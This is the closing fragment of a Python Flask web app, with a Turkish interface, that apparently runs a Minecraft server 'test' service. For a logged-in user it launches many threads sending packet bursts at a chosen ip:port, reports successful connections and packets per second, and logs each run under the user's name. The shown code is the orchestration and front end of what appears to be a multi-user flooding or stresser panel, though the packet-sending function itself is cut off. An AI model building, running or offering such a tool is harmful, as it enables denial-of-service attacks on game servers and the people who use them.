        thread = threading.Thread(target=send_mc_packets, args=(ip, port, thread_packets, results))
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()
    
    end_time = time.time()
    total_success = sum(r[0] for r in results)
    total_fail = sum(r[1] for r in results)
    duration = round(end_time - start_time, 2)
    rate = round(count/duration, 2)
    
    target = f"{ip}:{port}"
    
    # Testi kaydet
    log_test(session['username'], 'Minecraft', target, total_success, total_fail, duration, rate)
    
    result_text = f"""✅ Minecraft Sunucu Testi Tamamlandı!

Hedef: {target}
Toplam Paket: {count}
Thread Sayısı: {thread_count}
Başarılı Bağlantı: {total_success}
Başarısız Bağlantı: {total_fail}
Süre: {duration} saniye
Paket/Saniye: {rate}"""
    
    username = session['username']
    logs = load_logs().get(username, [])
    logs.reverse()
    
    return render_template_string(MAIN_HTML, username=username, logs=logs, result=result_text)

if __name__ == "__main__":
    import os
    port = int(os.environ.get('PORT', 5000))
    app.run(host="0.0.0.0", port=port)
